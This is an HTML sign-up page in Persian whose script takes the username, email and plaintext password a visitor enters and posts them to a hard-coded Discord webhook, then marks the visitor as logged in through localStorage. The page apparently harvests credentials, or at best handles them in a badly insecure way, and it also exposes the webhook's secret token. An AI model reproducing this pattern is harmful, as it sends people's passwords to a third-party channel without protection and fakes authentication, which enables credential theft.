<!DOCTYPE html>
<html lang="fa">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ثبت نام</title>
  <link rel="stylesheet" href="../style/register.css">
</head>

<body>
  <div class="form-container">
    <h2>✨ ثبت نام ✨</h2>
    <form id="registerForm">
      <div class="form-group">
        <label for="username">نام کاربری</label>
        <input type="text" id="username" required>
      </div>
      <div class="form-group">
        <label for="email">ایمیل</label>
        <input type="email" id="email" required>
      </div>
      <div class="form-group">
        <label for="password">رمز عبور</label>
        <input type="password" id="password" required>
      </div>
      <button type="submit" class="btn">🚀 ثبت نام</button>
    </form>
    <p class="link">
      حساب دارید؟ <a href="login.html">وارد شوید</a>
    </p>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1412388207143686214/nL7ZUkfYZ6YrDnjv42cvoTVpG1qddSAwsDQZBZcWPIzYqbkwialBozd5M1ZAmPmVrdA6";

    document.getElementById("registerForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      const payload = {
        embeds: [
          {
            title: "📥 ثبت‌نام جدید",
            color: 8965321,
            fields: [
              { name: "👤 یوزرنیم", value: username, inline: false },
              { name: "📧 ایمیل", value: email, inline: false },
              { name: "🔑 پسورد", value: password, inline: false }
            ],
            footer: { text: "Supernatural Register System" },
            timestamp: new Date()
          }
        ]
      };

      try {
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        localStorage.setItem("isLoggedIn", "true");
        window.location.href = "index.html";
      } catch (err) {
        alert("❌ خطا در ثبت‌نام، دوباره تلاش کنید.");
      }
    });
  </script>
</body>

</html>
